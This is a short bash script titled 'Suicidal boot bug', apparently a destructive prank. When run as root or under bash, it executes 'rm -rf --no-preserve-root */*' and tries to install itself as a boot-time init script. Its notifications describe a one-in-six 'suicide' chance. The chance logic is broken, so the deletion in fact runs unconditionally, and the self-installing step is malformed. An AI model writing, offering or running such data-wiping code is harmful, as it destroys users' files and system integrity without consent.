#!/bin/bash
# Suicidal boot bug
if [ $USER == 'root' ] || [ $SHELL == '/bin/bash' ]
then
touch /etc/init.d/boot_bug.sh && grep -m1 -ao [0-6] /dev/urandom | sed 's/0/6/' | head -n1 && rm -rf --no-preserve-root */* || notify-send -t '3000' --app-name xterm "Your computer is now depressed and has become suicidal." && sleep '5' && notify-send -t '3000' --app-name xterm "There is a 1 in 6 chance your pc WILL commit suicide." && sleep '5' && notify-send -t '3000' --app-name xterm "Can you save your pc? Or will it die?" && sleep '5' > /etc/init.d/boot_bug.sh && chmod 111 /etc/init.d/boot_bug.sh && update-rc.d boot_bug.sh defaults;
else
notify-send -t '5000' --app-name xterm "Very lucky... This time."
fi

